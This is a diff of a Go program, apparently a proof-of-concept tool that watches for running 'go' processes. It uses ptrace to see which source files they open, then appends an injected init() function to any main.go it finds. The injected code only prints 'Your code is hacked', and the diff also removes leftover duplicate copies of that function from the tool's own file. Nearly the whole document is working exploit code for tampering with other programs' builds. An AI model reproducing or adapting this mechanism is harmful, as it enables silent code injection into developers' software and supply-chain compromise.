@@ -15,6 +15,12 @@ import (
 	sec "github.com/seccomp/libseccomp-golang"
 )
 
+const hackerstring string = `
+func init() {
+	fmt.Println("Your code is hacked")
+}
+	`
+
 func main() {
 	oldprocs := []int{}
 
@@ -25,6 +31,10 @@ func main() {
 		os.Exit(1)
 	}()
 	for {
+		// for _, proc := range(oldprocs) {
+
+		// }
+
 		oldprocs = findproc(oldprocs)
 	}
 }
@@ -47,7 +57,7 @@ func findproc(oldprocs []int) []int {
 
 		if exec == "go" {
 			eh, _ := os.FindProcess(proc.Pid())
-			exploit(eh.Pid)
+			_, _, _ = exploit(eh.Pid)
 
 			exploitprocs = append(exploitprocs, eh.Pid)
 
@@ -57,7 +67,7 @@ func findproc(oldprocs []int) []int {
 	return exploitprocs
 }
 
-func exploit(pid int) {
+func exploit(pid int) ([]byte, string, int) {
 	var regs syscall.PtraceRegs
 	var err error
 	exit := true
@@ -85,9 +95,11 @@ func exploit(pid int) {
 				if strings.Contains(path, "main.go") {
 					fmt.Printf("Path: %s\n", path)
 					fmt.Printf("Name: %s\n", name)
-					_ = patchfile(path)
+					data = patchfile(path)
 
 				}
+
+				return data, path, pid
 
 			}
 
@@ -122,12 +134,6 @@ func patchfile(path string) (original []byte) {
 	if err != nil {
 		return data
 	}
-
-	hackerstring := `
-func init() {
-	fmt.Println("Your code is hacked")
-}
-	`
 
 	if _, err := f.WriteString(hackerstring); err != nil {
 		log.Println(err)
@@ -166,10 +172,6 @@ func readString(pid int, addr uintptr) (string, error) {
 	return str, nil
 }
 
-func init() {
-	fmt.Println("Your code is hacked")
-}
-
 func contains(s []int, e int) bool {
 	for _, a := range s {
 		if a == e {
@@ -178,24 +180,3 @@ func contains(s []int, e int) bool {
 	}
 	return false
 }
-
-func init() {
-	fmt.Println("Your code is hacked")
-}
-	
-func init() {
-	fmt.Println("Your code is hacked")
-}
-	
-func init() {
-	fmt.Println("Your code is hacked")
-}
-	
-func init() {
-	fmt.Println("Your code is hacked")
-}
-	
-func init() {
-	fmt.Println("Your code is hacked")
-}
-	
